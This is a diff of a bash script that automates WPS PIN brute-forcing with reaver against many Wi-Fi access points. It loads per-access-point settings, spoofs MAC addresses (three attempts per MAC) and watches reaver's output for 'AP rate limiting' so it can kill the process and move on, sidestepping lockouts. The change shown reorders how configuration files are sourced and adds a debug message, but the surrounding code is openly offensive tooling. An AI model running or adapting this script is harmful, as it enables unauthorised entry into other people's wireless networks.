@@ -483,13 +483,13 @@ while true; do
       fi
 
       ############ INCLUDE SPECIFIC SETTINGS PER ACCESS POINT ###################
+      # we don't want use option of previous AP, which might not be overridden by "perAp" configuration file
+      # se defaults should be included in a first place
+      source "$(pwd)/configurationSettings";
+      # if we want to override some default options using "perAp" file it's included below
       if [[ -f "$(pwd)/configurationSettingsPerAp/$BSSID_CLEAR" ]]; then
-          echoBlue "I've included specific settings for '$ESSID' from file $(pwd)/configurationSettingsPerAp/$BSSID_CLEAR";
+          echoBlue "I've included specific settings for '$ESSID' from file $(pwd)/configurationSettingsPerAp/$BSSID_CLEAR";    
 	  source "$(pwd)/configurationSettingsPerAp/$BSSID_CLEAR";
-      # but we have to include default configurationSettings again for another APs
-      # to prevent overwriting of default setting by one AP to all APs
-      else 
-	  source "$(pwd)/configurationSettings";
       fi
 
       ########## SLEEP BETWEEN APS ###############
@@ -574,6 +574,7 @@ while true; do
 	  echoGreen "$CM" && eval $CM 2>/dev/null
       fi
       # there are only 3 attempts from 1 MAC
+      echoBlue "Additional options are: $ADDITIONAL_OPTIONS";
       COMMAND="reaver -i mon0 -b $BSSID -s $SESSIONFILE --channel=$CHANNEL --mac=$MAC -vv $ADDITIONAL_OPTIONS";
       # output of reaver is piped to perl which checks if 'AP rate limiting' is printed by reaver, and reacts creating temporary file indicating that WPS is blocked
       # and kills reaver process so loop can continue
